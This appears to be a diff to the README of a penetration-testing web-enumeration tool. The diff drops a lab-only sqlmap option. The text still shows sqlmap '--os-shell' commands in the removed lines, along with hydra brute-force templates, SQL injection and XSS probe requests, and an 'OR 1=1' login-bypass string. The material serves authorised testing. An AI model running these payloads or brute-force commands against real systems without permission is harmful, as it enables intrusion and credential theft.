@@ -134,7 +134,6 @@ webenum --url http://192.168.50.100 --deep --vhost target.htb
 | `--threads N` | ffuf thread count (default: 40) | `--threads 20` |
 | `--rate N` | Max requests/sec, 0=unlimited (default: 0) | `--rate 100` |
 | `--ffuf-ac` | Enable ffuf autocalibration after reviewing baseline behavior | `--ffuf-ac` |
-| `--lab-tools` | Include SQLmap suggestions for non-engagement labs | `--lab-tools` |
 | `-h, --help` | Show help | |
 
 When launched through `sudo`, the default `$TOOLKIT_ROOT` resolves to the invoking
@@ -231,7 +230,7 @@ Aggregates everything into `summary/summary.md` (structured report), `summary/su
 - **Swagger/OpenAPI** — `curl`/`jq` inspection and API object fuzzing
 - **API endpoints** — `curl`/`jq` inspection for discovered `/api` paths plus API object fuzzing
 - **POST login form evidence** — form extraction plus `hydra http-post-form` template when source indicates a real login form
-- **parameters** — manual SQLi/LFI/XSS probes by default; `sqlmap` is emitted only with `--lab-tools`
+- **parameters** — manual SQLi/LFI/XSS probes only
 - **parameter-name attack hints** — LFI/traversal, RFI, command injection, SQLi, and XSS probes only when discovered parameter names support those paths
 
 ---
@@ -398,7 +397,6 @@ hydra -L users.txt -P passwords.txt TARGET http-get /admin
 curl -sk "http://TARGET/page?id=1%27" | head -60
 curl -sk "http://TARGET/page?id=1%20or%201=1" | head -60
 curl -sk "http://TARGET/page?id=%3Cscript%3Ealert(1)%3C%2Fscript%3E"
-# Add --lab-tools when you want sqlmap suggestions in non-engagement labs.
 ```
 
 ### robots.txt Disallow Entries Found
@@ -599,18 +597,6 @@ admin' OR '1'='1'--
 curl -sk "http://IP/page.php?id=1'"          # single quote error
 curl -sk "http://IP/page.php?id=1 AND 1=1"  # should return same as ?id=1
 curl -sk "http://IP/page.php?id=1 AND 1=2"  # should return different/empty
-
-# Lab-only automated scan (not emitted by default; use --lab-tools)
-sqlmap -u "http://IP/page.php?id=1" --batch --dbs --level 3 --risk 2
-
-# If POST form
-sqlmap -u "http://IP/login" --data "username=admin&password=pass" --batch --dbs
-
-# Lab-only SQLi-to-RCE checks (if MySQL with FILE privilege or MSSQL with xp_cmdshell)
-# MySQL
-sqlmap -u "http://IP/page.php?id=1" --batch --os-shell
-# MSSQL
-sqlmap -u "http://IP/page.php?id=1" --batch --os-shell --dbms mssql
 ```
 
 ---
